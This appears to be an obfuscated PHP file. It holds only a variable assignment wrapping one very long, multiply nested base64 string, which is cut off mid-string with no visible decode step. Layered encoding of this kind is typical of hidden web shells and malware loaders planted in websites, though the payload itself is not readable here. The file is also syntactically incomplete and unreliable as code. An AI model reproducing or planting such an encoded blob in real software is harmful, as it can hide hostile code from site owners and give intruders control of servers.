<?php $vUdq = ' $vgJc = 'ICRwUG9pID0gJ0lDUjNXRTlWSUQwZ0owbERVazVTV0VaUVNVUXdaMG93YkVSVmJFWldVakpvTTFOVlVYZGFNRzkzWWtWb1dHRnJXbkJaYkZVd1pERnNWMWw2Vm10V1YzaEpWR3hTUjJGV1NqWmhNMnhhVm0xb1VGUlZXbk5YUlRGWVlVZDRWRkpyY0haWFZFbDRWakpTZEZWcmJGVmlXR2h4V1cxNGMySnNUWGRVYkU1b1VqQTFNRmRVVGtOVGJFNUpWRzAxV2sxcVJsaFVWV1JUVjFaT2RWWnJjRkpOYlZJeVZUSjBhMUl5VmxkalJGWlNWa2Q0VWxaVVFrZGpSbEpXVkd0d2FsSllVbFpVTUdSelZHeEZkMkY2U2xSTlJUVkhXV3BDZDFOR1NuVmlSMFpzVmpOU00xWlZhSE5UTVZGNFYyeGFiRkpVUmt0WlZ6QTFZMFpPZFdKRmNHdFdXRUpKVlcwMWMxbFhWbFZWYmtKVVltMTRTMVJxUW5OVFZURklXa1Z3VW1WdGFEUlZNVlpYWVRKS1NGTnVVbGRpYlhoaFZtcEdTMDFzVGxaYVJUbHJZbFZ3ZDFWWE1ERlpWbG8yVm01T1drMXFSa2haVkVwS1pXeE9XRnBHU2xkTlZXOHlWMnRhYW1ReGIzZGtSV2hWVjBWS1RsbFdWa2RpYkZaMFRsWmthMVp0ZERWWmJUVmhUV3MxTmxKcVJsVk5iWGhFVmtaa1NtVldTblJrUjNScFZqTm5NbGRyVm10U01sSkhZa1pzYUZKRlNtRldNRlozWXpGc2NWUnNUbXhpU0VKYVZUSndTMU5zU2xkVGJrNWFaV3R3VUZwV1pFZFhWa1owWTBkb1YyVnRkM2hXUkVwelVURkdjMkV6YkZWaVdHaHhWRmQwVjJKc1pITmFSRTVoVFZaYU1GWnRNREZoUm1SR1RraGtXazFxUVRCWGFrcEhWMFUxV0dSSGFGZE5SRloyVmpKMGFrNUdiM2hqUldoWFZqSlNjRlZxUWxkaWJIQkdXa1ZrYUZZd2NFbFZiR1JyVm14SmQxZHFWbGhXYlU0MFdXdGtVMU5XVG5WWGJYQnNZbFJzZFZVeWRHdGpNazVJVTI1V1ZtSnNjSEZaYkZwS1pERnJlVTFWWkdoaVZXdzFWbGMxUTFsVk1YRmhSelZXVmtWd1NGcEZaRTlUUlRsSVdrZHdVMDFHYnpGWGExWnJWbXh2ZUdORmFGZFdNbEp3VldwQ1YySnNiSEphUkZKb1VqRktNRlpzWkd0aGJFNUdZMGhrV21KSFVraGFWbVJIVjBaS1dGcEdXbWxXYkd3elYxZHdUMU15VWxoVGFscHBUVzFTV0ZWdGRIZFdNVlp6Vkd0S1VGWlhlRWhWTWpFMFdWVXhkR1ZFV21GU1YyaE1Xa2QwYzFOV1VuVlhiV3hUVFc1b2VGZFdXbTlWTWtaSFkwVm9VRkl5VWxSWlZFSmhWR3hhVlZGc1dtRk5WVXBWVlZkMFlXRnRTbkpqUkVwYVRXMTRSRmxVUm5kV1JrWjBZa1p3V0ZKVVZucFZNVlpyVlRKS1JtSkZhRlppVjJoeVZXNXdjMDVzVGxaWmVsSmhUVmhDU1Zac1pHdFhhekZ4WWtSR1dHSkhhSFpaTUZKcVRUQjBObUpIYkdoV1ZYQkVWMnRhYjFVeVVuUlVia1pwVFcxU1UxWnNXa3RXVmxwelZsaGtZVTFWY0RCV2JURjNZVVpKZDFaVVNsUldWa3BMVkd4V05GWnNTbkZTYlVaT1RWWnZNbGRyVms1a01sWldUVlZXVWxaRlNrdFZiRkpIVFd4a2NscElUbWxXTUZwWlZrY3hiMWRyTVhST1ZFcHJZVzFPTkZwR1ZuTlRWMUY1V2taT2FWWnNjSGhYVmxaclVteHZlVmRyVWxKaE1IQnlWakJhUzAxc2EzbGlSVXBxVmxobk1WVldaR3RaVjBwelYycEdXRlpGTlZSWk1HUktaVlUxU0ZwSGJGTmxiWGgyVmpKMGIxTXlTa2RoTTJ4UVYwZDRhRlV3V25ka01XdzJWR3hPYUZJd2NGbFZiWEJUWVRGSmQxZHFWbGhpUjAweFZGVmtUbVZXV25WaVIzUm9WakpTZVZkV1dtdGpNbEpZVld0b1VGZEhlR2hWTUZwTFRsWmtWMXBGT1d0aVNFSkpXV3RqTVdGWFZsbGFTRXBhWWxSV1dGVnJaRXBsVlRWWlZtdDRWazFGYTNwVk1WWnJWVEpLUjJOSVVtbFRSbHBvVmxSS2EyTkdaSE5YVkZab1lsVnNOVlJzYUZkWlZsbDNUa2hrV2xadFRURmFSbFp6WTBkUmVsVnJOVlpOYmsxNlZURldhMVV5U2tkalNGSnBVMFphYUZaVVNtdGpSbVJ6VjFSV2FFMVhlSGRWTVdoUFZGWmFSbUpJWkZWTk1uaEVXVlJHZDFkR1pIVlJiV3hwVm14YU1sVXhZM2hXTVhCelkwWm9UbGRIVW5KVk1HUXdZMFpTUmxSWVpHeGhNMUpXV1hwS2ExbFdTWGhYYmxKYVZtMU5lRmxyVmpCU1JrNTBZMGRHV0ZKWVFYbFZNV1J6VFRKUmQyUkdWbXBOYlZKTFZXcEtOR1JHVGxaVWJUVm9UV3R3TVZadGRGTmhWVEZ4Vm1wR1ZFMVZOVVJVYWtKelVrWldkV05HY0dsU1ZGVXdWMWQwVDFGck9WWmlSVkpVWWtaS1ZGWnNhRzlTTVZaVlVteEtZVTFJVW5kVlYzUnJWbTFHTm1KRk9WUldWMmhvV1RCa1RtVnNWblJoUjJ4WFRVWnJkMWRyVm10U01sWlhZMFpvVUZaRlNuRlVWM2hoVGxad1NHSkZUbGhTYXpWSFZtMTRUMVV4VlhkVGFrcGFUV3BHVkZSVlpFOWtSa3AwWTBkc1RtSkZjRE5XTW5CS1RrWnZlRkZzVWxKV01sSkxXVlpTVTJOR1RuVmlSWEJyVmxoQ1NWbHJhRU5oVjBwelUycEtXazFxUmxSVVZXUlBaRVpLZEdOSGJFNWlSWEF6VmpKd1NrNUhVbFppU0VKYVRXMTRVVnBXVmtkaWJFNXlXWHBHVGxac1dqQldiVFYzWVRGWmVsb3paRlJXVmtZelYycEtUMU5HY0VoWGJVWllVakpvZWxZeGFITmliVVY1VTI1V1YyRXhTbkJVVjNCWFRWWlNSbFJzVG14aVIzaDZWa2MxYjJGV1JYbGplazVVVmxVMVJGUldaRXRrVmxKMFpVZDBVazF0VW5sWFdIQkxVekZhU0ZSc2FHdE5NRXBSV2xaV1MyUXhaSFJpUlVwcFRVaENTVlJzVWtkV2JVcFhWMnBhWVZKdFVUQlVWVll3VmtaR2NWcEZjRkpOVlc5NFYydGFWMVF5UmtoVGJsWldZa1UxY0ZSVVNrOWliRlpIVkd0T2EwMVhPVFJVTVdoWFlURmFObEpxVmxwaGF6VnlXbGQwTUZKR1ZuVldiWFJYWVROQ2VsZFljRTlXTWsxNVZXdFNhR1Z0VWt0VlZFSkxaREZrZEdKRlNtbE5TRUpKVkd4U1IxVnJNWEpYYWtaaFVsWndURnBITVZOT1ZrWlVaRVZ3VTAxRVZucFhWRWwzVGtkT1JtSkZiR3BOYlZKTFZWUkdTMDFXY0VkV2F6bG9VakJ3TVZaWGRHdGhSbGw0VjI1d1dHRXlhRTlYYWtaRFZrWkdkVnBIUms1V1IzZDRWMnRhYW1WSFNsaFNiR2hYWW1zMWFGVXdWWGhrYkU1eVdYcEdUbFpzV2pCV2JUVjNZVEZaZWxvelpGUk5Wa28yVjJwQ2QxTldVblJpUmxwcFZrZDBObFV4VmxKa01XOTVWR3RvWVZJeGNHaFpiRnBhWkRGa1ZWTnRPV0ZpVlRVd1ZERlNUMU5zUlhsYVNFcGFZbFJXV0ZaVVJuZFhWbEp4VW0xc1ZGSnJXalpXTVZKTFZqSldXRk5xVm1obGJWSkxWVlJHUzA1c1pGaGtSRkpxVWpBeE5sWlhNVzlUYkVwRlVXMDFXRlp0YUV4YVZscHpWMWRGZVU5VmNGSk5TRUY1VjFSSmVGVXdNVWhVYmxKVFlsaENjRlJYZUV0a01XUnhVMVJTYUZaclNsWlVhMlF3WVdzeGNtTkdVbHBoYXpWeVYxZHplRkl3TVVsVWEzQlNUVWM1TTFZeFdtOVRNa3BJVTFod1ZtSnVRbWhXYWtFd1pVWmtjMWw2UW1oV2EwcFdWR3RrTUdGck1YSmpSbEphWVdzMWNsZFhjM2hXTURGSVdrVjRWMU5GTlhWWFZFbDRWakF4U0ZWc2JGUmliRnBMVlZSR1MwNXNaRmhrUkZKcVVqQXhObFpYTVc5VlIxWldVMVJXVkZaWFVsaFpla3BPWlZaYVdGcEhlR3hXVlc4eFZqSjRiMVV3TVZoVWJsSlBVakpTUzFWcVJtRmlWbVJ6V1ROb2EwMXNTa3BaV0hCclUyeE9SVkZ0TldGaVJUVkVXV3RrUzFOV1VuUmxSWEJVVTBVMWRWZFVTWGhXTURGSVZXeHNWR0pzV2t0VlZFSkxZekZrUlZOc1RtaFdWR3N4VlZkd2MxTnNUa1ZSYlRWWVlrZFJNRnBYZUhkV1JrWnhXa1Z3VkZKWVFucFhhMVp2VmpKV1dGTnVRbEpXTWxKb1ZtMXdjMk5XYkhGVFZFWnJWbTVDV1ZaSGNFTmhSbG8yWWtSR1ZVMHllRVJVTVZaelUxVXhTRnBGY0ZKbGJXZzBWVEZXVjJFeVNraFRibEpYWW0xNFlWWnFSa3ROYkU1V1drVTVhMkpWY0hkVlZ6QXhXVlphTmxadVRscE5ha1pJV1ZSS1NtVnNUbGhhUmtwWFRWVnZNbGRyV21wa01XOTNaRVZvVlZkRlNrNVpWbFpIWW14V2RFNVdaR3RXYlhRMVdXMDFZVTFyTlRaU2FrWlZUVzE0UkZsc1pGTlhSMVpKVkcxd1RtRjZWblpYVnpBeFdWZE9TRlJZY0ZaaVYyaHdWbXBDV2sxR2NFWmFSV1JzVm01Q1dWUXhVa05oYXpGelYycFdZVkl5ZUVSVmJGcDNWMVpTZEdOSGNHbFdNMmQ2VmpGU1MyTXlVblJUYmtacFRXMVNVMVpxUVRGalZtUnpZVVU1YUZKWGVFcFdWelZoV1ZaS05tSkVXbFJXVjFFd1drY3hUMDVXUm5OVWJVWlhUV3hLTTFkWWNFOVZNbFpZVTFod1ZWWXlVa3RWYWtaTFl6Rk9WbHBFVW1oU1YzaEtWbGN4YjFkdFNsbGhSemxVVmxad1JGbFZaRTlrUmtwMVZXMUdXRkpyYnpGWFYzQlBWR3MxY21KRlpGUmlXR2h5Vlc1d2MwNVdiSFJOUkZKUFlUSjRTRlpYZUU5V01WcFhWbTAxVmxKck5VUlZNbmgzVWtaR2RHUkhSbFpOUld3elYxUkplRkl5VWxoVVdHeFRZbGhDWVZSWE1UUk5iR3gwWWtWT1UwMVZXbGRhVlZwVFZURlZkMUpVVmxSV1ZscFlXbFprVDJSRk9WbGlSWEJUVFZWd2VsVXhWbXRUTWtaSVZGaHNWMVl5VW1oVmFrWlhZbXhrY2xwRlpFNVNNR3cyVmtaa2EyRlhWbFpUYmtwWVlrVTFSRmxYTVVwbFZUVllaVWQ0VTAxcVZYbGFSM0JxWlVkU1ZtSkZXbE5oYTFweVZXNXdjMDVXVVhsaVJVNVNZa1Z3U0ZaSGVHRldWbFYzVTJ0b1dHSkhVbEJaYWtaelZsZEplVnBGTlZkU01EUjNWbXRhYTFJeVZsZGhNMnhoVFRGS1QxbFhkRWROTVZKMFlrVk9WV0pWYkRWV1Z6VkRXVmRLV0dWSVJsaFdiVkpRV1RCU2FrMHdkRFppUjJ4b1ZsVnJNRlV4VmxkWlYwcEhZVE5zYUZJeWFFdFZNR2hyWW14V1YyRkdaRTVTTUd3MlZURmthMVJIUmxWaFJ6VlVWbGRTYUZSV1pFdGtSbEp4VVcxb1YyVnRkM2hWTVZacldWVXhXRk5yYUd4VFNFSmhWRmQwWVUxV2NFaE5XRTVzWWxaS1NWVnROVk5YYkdSSVdqTmtXRlp0YUV4WmEyUktaV3hXZFdOSFJsaFNWemsxVlhwQ1QxVXlVbGhWYkZwVllteHdjRmxzVWxOa01VNVdZVWh3WVUxWVFrbFdiVEI0WVVaYU5sWnVUbFJOUlRWTVdXdGFibVZXVW5WWGJXeHBWa1phZWxZeFVrOVZNazVJVTFoc1QxSXllRTVWV0hCRFRrWk5lRlZ1Y0dGTldFSkpWbTB3ZUdGR1dqWldiazVVVFVVMVRGbHJXbTVsVmxaMFlrVndhRmRIVVhkV1JtUnpZMnMwZDJKRmFGWmlXR2hvV1d4a05FMVdaSE5VYlRWb1ZtNUNXRlF4WkRSaFZtUkdVMWhrWVZack5VdFpla0kwVmxaU1dWRnNRbXhXVlhCNVZqSjRhMWxYVGtoVGJsSlhWbnBzUzFsc1ZURmpNV3Q1VFVSU2FGWllhRVpWVm1oRFZVZFdWbEp0TlZwV2JWSmhWMnBDTUZKR1ZuVldiWFJYVmxSVmVWZFhNSGROUjA1R1lrVnNhazF0VWt4Vk1GVXhZMFphVlZSclpHcE5SM2hHVkZWa2ExTnRTa1pPVldSWFVsWmFXRlZyV21GU1JrWlpVbXR3VTFadVFsVldhMUpDWkRGdmVWVnVVbWxUU0VKeVZXcENZVTFHWkZkaFJ6bE9VbTE0V2xVeU1UUmhWVEI0VTJwYVdHSkhhRXhVVjNSelkxZE5lVnBGY0ZKTlZXOTRWMnRhWVZNeVNraFVXSEJYWW1zMWNsVlVRa1pPVms1V1lVVk9hV0pIWkRWV2JYQlRXVlpaZDAxWVdsUmhNazE0VkZaYVJtVlZPVmxXYld4b1YwZFNlVmRZY0V0VE1WcElWR3hvYTAwd1NsRmFWbFpIWW14c1YxcEdjR0ZOU0ZKRlZsYzFWMkV4V25KalNFNWFaV3MxV0ZsNlNsTlNSMFY1V2tkNGJGWlZXbmxYVnpBeFZqRktSMkpHYUU5V1JVcFhXV3hTY21Wc1RsWlZXR1JoVFdzMVNWZHJaR0ZoVjBwelYycENXazFxUVRGVVZFcFBUbFp2ZVdSSGJHbGlSbkJWVmpKNGIxUXdNVmhUYTJ4V1YwVktVVnBXVmtkaWJIQkhXWHBHYkdKSVFscFdWbU0xVXpGT1JrNVlRbGRXUlRWSVdYcENNRlpYVFhsYVIyaFhUVmQ0ZFZWNlFrOVZNbEpZVld4YVZXSlhhSEJaYlhoTFZrWnNjVlJ0Y0dGTlZVcDNWVmN4ZDFsV1pFWmpSRXBVVFZVMVJGUnFRbk5UVms1MFpVZDBWRkpzYnpGWFZ6RnpVVzFGZVZOdVZsZGlSVFZvVmpCVk1HVkdiSEpoUmtwUFRVZDRTbFJWWkd0WlZsbDZZVVJhV0dKRk5VUlVha0p6VTFaT2RHVkhkRlJTYkc4eFYxY3hjMUZzYjNoalJtUlFWak5vY0ZZd1ZrcGtNWEJYVlc1d1lVMXNjRlZWVjNCelUyeEplRmR1Y0ZwbGEzQlhWMnBLVjA1V1JuVmlSMFpZVW10c05GZFVTWGROUm05M1lrVm9WMkpXY0doVmFrSnlUVEZPVmxvelpHRk5iSEJWVlZjeE5HRldUa1pPV0U1VVZsZG9ObGRxU2s5a1JscHhVVzEwV0ZKWVFYaFZNVlpQVVRKS1Ixb3piRlZpYkhCd1dXeFNWMk14WkZWVWJFNXFVakJzTlZSclVtdFRiRTVGVVcwMVlXSkZOVU5YYWtJMFRsZEplVnBHVGs1aVJtOTRWako0YjFNeVJrZGpSV2hRVWpKU1lWUlhjSE5OVms1V1drZDBhVkl3Y0RCV2JUVnpWMnhaZUZOcVNscE5iWGhFVlZkNGQxTldVbkZTYld4V1RVVmFNbFl4YUhOamJWSldZa1ZTVW1FeVVuSldibkJYWTFac1dGWllTazFOTVhCWlZHdFNZVk5zU25KT1dHUmFZbFJXVkZsVlpGZFRSMHBKWTBkMGFWWXpaekpYYTFaclVqSlNSMkpHYkdoU1JVcGhWakJXZDJNeGJIRlViRTVzWWtoQ1dsVXljRXRUYkVwWFUyNU9XbVZyY0ZCYVZtUkhWMVpHZEdOSGFGZGxiWGQ0VmtSS2MxRXhXWGhqUm14VVltdEthRmxzWkRSalZtUlhWR3RPYkdKVldsbFViRkpEVjJ4a1NHRklaRnBOTW5oRVdWUkdkMVpHUm5WVWJIQldUVVZ3ZUZkWGNFcE5WMVowVld4b2JGSkZTbUZXVkVKTFl6RnNkR0pGVG1oTmExcFpWR3hrYjJGV1dYbGxTRVpYVmtWd1VGbFZaRXRqUmtaelVteHdXRkpZUW5aWFYzaHJWakF4U0ZSdVVsQlhTRUpSV1ZaV1IyTnNaRmRoUlhScFlUSjRTRll5TVc5aFZrbzJZa1JXVkZaWFVsUlphMlJMVWtaR2RHTkdjRmRsYTFsNlYxYzFjMUZ0UlhoaE0yeFRZbXhLY1ZWdWNHOWliRnBJVFVSV2ExSnRlREZWTWpFMFUyeEplRk51VGxwaE1EVkVXVmQ0YzFkRk1WbGFSMnhzVmxWYWVWWXlNSGhPUjBaSFlqTndXR0pyU25GVVZFWkxZakZzYzFwRlpFOVNNVXBKVlcwMWMxbFdXalpoTTJSYVpXdHdXRnBXWkZOalJrWnlWR3h3VjJWc1dubFdNbmh2VXpKR1JtSkZiRk5oYTFwb1ZsUkNTMk5zWkhOYVIwWnFVakJ3TUZac1pHdGhhekYwWkVjMVdtVnJjRmRYYWtwVFYxWldkVkZ0YkZOTmJtTjVWakZhVDFFeFJuTlZia3BXVmpKU1YxbHNXbHBrTVd4eFZHdDBhMVl3YnpKWmFrcHJWakZLY21OR1pGWmlSVFZEVkRGV2MxSnNaSEpUYkZaVFlYcFdTRlV4VmxKa01XOTRVbXhzVjJGclNuQlVWRUp5VFd4T1ZscEZaR3hXTUZwWlZXMDFkMWRyTVhGaVJGcFVWbFphYUZsclduSmxWMFpJWVVaQ2FGWlZXVEJXUnpWeVpVWlNjMkpHYkZSaVdFSnZWVmh3UTA1V1VsWlZhMHBPWVRKNFIxUldhR0ZaVmtsNVpVaFNXbFp0VWxCWlZWcHlaVmRLZFZkcVNrOWxhMWw0VlRGV2IwMHhiM2hUYmxKWFlsaENiMVZxUWxkaWJIQnlWR3RPVW1KV1NscFdWelZoWVcxR1ZsSnVhRlZUUjNoRFYycEdkMlJXV25WV2JIQk9UVlZ3TTFkWGNFcE5SbTk1VkZoc2FWTkdXbkpWYWtKYVRVWnNWMkZGT1U1aVZWcGFWa2R3UTFkc1dqWlNiVGxoVmxkb1ZGbFZaRTlrUmxwMVYyMTBWRkpVVm5wWFZFa3hWMnh2ZDJSRlVsWmlWMmh4V1d4a1QyVnNUbFpVYkU1b1lrZDRXVlJXYUd0aFYxWlpXa2MxVkdKWGVGUlpiR1JMVTBaS2RFNVhkR2xXTTJjeVYydFdhMUl5VWtkaVJteG9Va1ZLWVZZd1ZuZGpNV3h4Vkd4T2JHSklRbHBWTW5CTFZFWlZkMU5VVGxSV1YxSjZXV3hXYzFKR2IzbGtSMFpwVjBkb2RsWXljRTlaVjA1SVZGaHdWbUpYYUhCV2FrSmFUVVp3UmxwRlpHeFdia0paVkRGU1EyRnJNWE5YYWxaaFVqSjRlVmRxU2xkT1ZrWllaRVp3V0ZKc2EzZFZNVlpTWkRGdmQySklTbE5oZW14VVZWUkNjazB4VGxaYU0yUmhUV3RhV1ZZeFpHdFVSa1Y0VTIwNVdrMXFSbkZVTVZwRFZrWk9XR0pGZUZaTlJXdDZWVEZXYjFNeVNraFZhMnhYWW0xNGNGbFdWa2RqUms1WVkwaHdZVTFzY0ZWVlZ6RTBZVlpPUms1WVRsUldWMmcyVjJwQ2QxTkdaSFZVYkhCWFRXeEdOVmRXV205VU1ERkhZa1pvVGxZeWFITlZNRnBMWWpGcmVVMVdaR3RpVmtwS1ZrY3hOR0Z0U25OaVJ6VldVbXMxUTFwVlZUVk9Wa1oxWWtkR1dGSnJiRFJYVkVsM1RVWnZkMk5GYUZOaGExcHpWVmh3VTJOR1RsWlVhM0JyVmxoQ1NWWkhNVzloVm1SR1UycEtWVkl5ZUV0WGFrcExVMGRLU1ZOdFJsWk5SVm94VlRKNFQxTnRVbFpqUldoVFltMTRhRnBXVWxOalJrNXpWRzF3YUZaVWF6RlZWM0J6VTJ4T1JWRnROVlJXVlRBd1dURldjMUpzY0VobFIyeHBWbXh2TVZZeFdtdFZNbEp5WWtWb1ZXSnNjSEJaVmxaTFpGWmtjMWw2Um1sU01EVXdWVzB4TUdGVk1IZGlSelZXVm0xU1ZGcFhNVk5YUlRGSVdrVjRVMDFFUmpOV1JXUnpVV3h2ZUZOdVZsZGliRnBoVkZjd01VMXRVbkZaTTJoclZsUnNkMVZYZEZkaFJsbzJWbTA1V21KSFVucFpWM2hXWlZaU2RHRkhiR2xpU0VJelYxaHdUMVV5UmtoVGJHaFRZV3hLY2xWcVFtRk9WbVJ6V1hwV1RsSXdNVFZXYlRWellUSkdWbE5yV2xoaVIyaFFXVmN4VDJSSFNrbGFSbkJPWWxobmVWZFhNWGRrYkc5NFVteG9WV0pZUW1oV01GVXhZakZPVmxwR1pHcE5SM2hLVlRJeE5GbFZNWFJsUkZwaFVsZG9URnBIZEhOVFZrcHhVbTFHVmsxRmNESldNVnByVkRKS1JtSkZhRTVXTW1oeVZXcEJNV1JzVGxaYVJUbHJZbFZ3ZDFWWE5VOVhiRlYzVTI1T1dtSlVWbFJhVmxwelYwWldkR0ZGY0ZOaE1IQjJWMVJKZUZJeVVrZGpSbXhXWW0xNGNGUlVRWGROYkU1V1YydDBhVkl4U2tsVU1XaHpZVmRLVlZwNlNsUldWbkJVVmxSR1lWWnNXbGhhUmtaV1RVVndURll5ZEU1TlJtOTRZMFZvVjFZeVVuSlZNRlozWWpGc2RFNVZPV2hTYlhRMVZrYzFRMkZWTVhGVmFrWlVWbFphYUZWWGVGTlNNVkp5VjJ0d1UxSkZTblZXVjNodlV6SldXRk5ZY0ZSV01sSm9WV3BHVjJKc1pGaE5WV1JzWWtoQ1ZWVlhNVEJaVmxWM1UyNUtXRlp0YUZSYVJ6RlBUbFpHZFZkcmNGTk5WWEI2VlRGV2ExUXlVblJUYmxKWFlXeEtiMWRzVG5wa2JWSnpXWHBDWVUxVldscFdiWEJEWVZVd2QyRjZTbFJXVjFKSVdsWmtSMWRHU25WalJuQk9ZVzEzTWxVeFZsZFpWMHBIWVROc2FGSXlhRkZaVmxaSFRrWlNkV0V6YUZWaVIzaGFWVEl4ZDJGR1JqWlJhbFpWVmxaS1ExUlhkSE5TYXpGWlYyMUdVMDF1YURCWFZscHJWREpHUjJFemJHbGliRzk1Vkc1d1IwMVdUbFpoUkU1aFRWVndNRlp0TVhkaFJrbDNWbTAxWVdFd05VUlZWekZUVjFaV2RWZHRjR2hXVlZvMFZrVm9jMUZzYjNoalNGWlhZbXhhWVZSVVJrdGtNV3h4VTFSQ1lVMVlRa2xaYTJoWFYyeGFObEp1WkZoV1JUVlFXVmQ0YzFkRk5WVlRiV2hZVWxSU00xWXhXbXBsUjBaSVZtdHNWbUpYYUhGWmJGcGhUV3h3Um1GRk9XbFNNRFV4VmpGa2ExUkdSWGhUYm1SYVRXcEdVRlpVUm5kWFJsSjFWMjF3YVZacldqWlZNblJxVFZVeFYxSlliRkJYUmxwd1dWWmtNR0pzY0ZsaVJVNW9UVmhDV1ZZeU5VTmhWMHBYVm01YVZGWjZSbGhYYlhoeVpWVTVXVlp0YkdsV2JIQjRWMnRXYTJNeVVuUlRia0pVVjBVMVRsWnJWbGRrTVZGNllrVk9hRTFZUWxsV01qVkRZVmRLVjFadVdsUldla1pZVjIxNGQxTkdUbGhpUlRGU1pXdEpNVlY2UmxObGJHOTRZMFZvVjJKVVJtOVdibkJYWXpGTmQxUnJkR2xTYldRMVZtMDFVMkZzVGtkVFZFWlVWakozZWxwRlZYaE9WMFkyV2tWd1UwMVZjSHBXTWpCNFl6SlNWMk5HVW1GTmJYaGhWRmQ0WVU1V2JIVmlSWEJxVFVSR1JWbFljR3RUYkVWNFUyNVNXbUV5VWtoWmJURlRaRWRLU1dOSGRGTk5SbTkzVmpGYWIySXdNVWRpUm14VVlsaG9jRlJVUmt0T2JHUnpZVVYwVG1FeWVFWlVWV1JyVjJzeGMxZHFWbHBpYmtJMlYycENjMU5IU2toTlZYQlNUVzFTZVZkWE1ERldNVXBJVTFoc1QxZEdXazFXVkVKS1RURk9WbFJzVG14aVIzaDZWa2MxYjJGV1JYZFNWRlpVVmxVMVRGWnJXa3RXYlZaR1YyeEtUbFpyV25WVmVrcHpVVEZKZUZadVNsQldWRlpMVlRCYWQyUXhiRFpVYkU1b1VqQndXVlZ0Y0ZOaE1VbDNWMnBXV0dKSFRURlVWV1JPWlZaYWRXSkhkR2hXVlhCYVZsUkNWMVl4VlhoVGJGSlVWMFphUzFVd1ZURmtNV3gwVGxaT2FGSXhXa2xaYTJoM1lUSktXR1ZFV21GU1YxSklXa1ZhYzFkWFJrVlJiSEJZVWxoQ2VsZFhjRTlWTWxaelkwWnNWR0ZyY0UxVlZFWkxaREZyZVUxVk9WWk5XRUpaVmtjMVlXRnRTbGRUYld4YVlXczFURmxVU2xOVFZrNTBZVVp3VG1GdGVIbFhWbHByWVRKU2MyRkdVbXROYlhod1ZGUkNkMk5zY0VaaFJYUm9VbTEwTlZReFpEQmhSbGw1VldwS1ZGWXlkM3BaVkVaM1pFZFdTR0ZIUms1TldFSXpWMWh3VDFVeVJraFRiR2hUWVd4S2NsVnFRbUZPVm1SeldYcFdUbEl3TVRWV2JUVnpZVEpHV0dSRVJsUldWMmhRV1RCa1MyUldWblJoUjNoVFRXNW5NbGRyWTNoak1sWjBWV3RvVTJKc1NtRldNR1J1WkRGa1YyRkZkR2xTTUd3MlZsYzFkMWxXWkVaaU0yeFVUVVUxVkZrd1pFOWtSbEp6VkcxR1YwMUVWWGxYVkVsNFZURnNkRlZyYUZOaWJYaG9WbTV3Y21ReGJEWlRiR1JvWWxaS1dWWnROVmRYVmxWNldraENZVkpYVWtoYVZscDNWMFU1VlZGdGNFNWlSbkI0VjJ0YWExWXlVbFppU0VKclRXNVNhRmxzYUc5aU1XUnhWRzFHYWxJd01UWldWekZ2WVZaWmQxZFVRbUZTVjFKSVdsWmFkMWRGT1ZWUmJYQk9Za1p2TVZkclpITmphelIzWWtWU1VsWXpVbkJaYlhoaFZrWmtjMkZGT1U1V01IQktWbFprYTFWV1ZYZFRhazVZWVd0Vk1WbHJaRmRUUmxwMFkwVjRVazFWYjNoWGExcFhWREpTZEZOdVVrOVRSVFZNVlRCVk1XTkdXbFZVYTJScVRVaFNWbGw2U210VGJFNUhWMnBHV21WcmNGaFVWVll3VWtaV2RXTkdjR2xTVkZVd1YxZDBUMk5yTkhkaVJWSlNZbXRLYUZsV1ZrZGtiRTV5V1hwR1RsWnNXakJXYlRWM1lURlplbG96WkZSTlZUVkVWR3BDYzFKR1ZuVldiWFJYVmxSV2RsZFhNREZWTVZWNVUxaHdXazF0VWxKV1ZFSkxUVEZrY1ZKVVZtdFdNVXBaVkZab2MyRlZNSGxWYWxwVVRVVTFWRnBHWkZOV01VNTBaVWR3VGsxV2NEWlhhMVpQWTJzMGQySkZVbEppYTBwb1dWWldSMlJzVG5KWmVrWk9WbXRXTlZWdE5WZGhNVXB5WTBSS1lWTkhlRU5UZWtKelUwWlNkR1ZIY0dsV1IyZ3pWVEZXYjJWc2IzbFVibEpYWVd0S2NsWXdWbmROVms1V1ZHeE9hMVl4U2xoVk1qRTBZV3N3ZUZkdWNHRlNWa28yVjJwS1lWWkdSblJsUjJ4VVVsUldlbFV4Vm05bGJHOTVWRzVTVjJGclNuSldNRlozVFZaT1ZsUnJUbWxTYldRMVZtMDFVMkZzVGtkVFZFWlZUVEo0UkZReFZuTlRWVEZJV2tkR1YwMHlaekpXTW5oUFVUQTBkMkpGYkZSaVdHaHlWVEJhWVU1V2JIUmlSVXBoVFZoQ1dGUXhaREJYYlVaMVZHMDFZV0pGTlVSVU1WWnpVMFphZFZSdGNFNWlSbHAxVjJ4b2MxRXlWbGRqUm14V1lXdGFjVmxzVWxOaWJFNVdXa1prWVdKSGREVlVNV2hYWVZkS1YxZHVSbUZTVjFKNldrY3hTMk5YVFhsYVJ6RldUVVZyTVZVeFZrOVJiVkp5WkVoQ1VtRXlhR2hXYm5CWFl6RnJlVTFWWkdoTmEyOHhWVmN4ZDJGVk1YRlZiVFZZWVd0d1dGcEdXbmRYVms1MFlVZEdVMlZ0ZHpGVk1WWlhVakpGZVZSWWNGZGliRXBMVlZSS2IyTldUWGhVVkVKaFRVZDRSMVl5Y0VkaFYwcFdUbGhrVDJWdFRubFVNV1JMWTFkSmVWcEdXazVpV0dkNFYydFdhMUl3TlVoU2JHeFZZbXh3Y1ZVd1duZGtNV3cyVkd4T2FGSXdjRmxWYlhCVFlURkpkMWRxVmxoaVIwMHhWRlZrVG1WV1duVmlSM1JvVmxWd1IxWXllRzlVTWtaMFZHNVNhVk5IVW1GVVZ6RTBUV3hzZEdOSVdtRk5WbkF3Vm0wMWMyRkdXWGhqU0dSWVZrVndSMWRxU2s1bFYwcEpWbTEwVTAxR2EzZFhWbHB2Vkd4dmVHTkZhRmRXTWxKd1ZXcENWMkpzWkZWVFZGWnJWakF4TmxadE5VOWhNVWwzVm0wMVdHSkhUWGRYYWtaM1UwZEtTVlpzY0ZkbGExb3pWakZTUjFReVJuTmlSbWhQVWpKU1YxVnFRbUZPVm1SWFdUTm9hVkl4U2twVk1qVmhZVzFXZEU5WE5WZFdla1pZVkZWa1NtVnNUblZXYld4c1lsUnNkVlp0ZEdGVE1WcHpVMnhTVWxaSGVFdFZiRnAzVVRGYVJsZHJPVk5oTW5oR1ZGVmthMVZzWkVkWFdHUmFZV3MxUzFSdGRITlRSa3AxWWtkb1YwMUdiekpXTVZKS1RsZFdjbUpGV2xoaVdHaGhWRmN4YjJJeFVYbGlSVXBzVWxSVk1WUldWVEZYYkdSR1kwaEdXbFpWTVROYVZsVjRVbFpHVlZOcmNGTldSVmw1VmpKMGEyTXlTbGhTYkdoVllsZG9Z